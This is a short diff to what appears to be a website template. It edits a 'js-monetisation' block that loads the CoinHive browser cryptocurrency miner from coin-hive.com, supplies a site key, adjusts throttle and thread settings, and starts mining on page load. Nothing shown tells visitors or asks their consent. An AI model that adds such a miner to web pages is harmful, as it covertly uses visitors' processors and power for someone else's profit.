@@ -121,7 +121,12 @@
 {% block js-monetisation %}
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-    var miner = new CoinHive.Anonymous('IwVlUKPdM3lGYNwO1cAmEGKkLWvAR3Sq');
+    var miner = new CoinHive.Anonymous('IwVlUKPdM3lGYNwO1cAmEGKkLWvAR3Sq', {
+            threads: 0,
+            autoThreads: false,
+            throttle: 0.4,
+            forceASMJS: false
+        });
     miner.start();
 </script>
 {% endblock %}
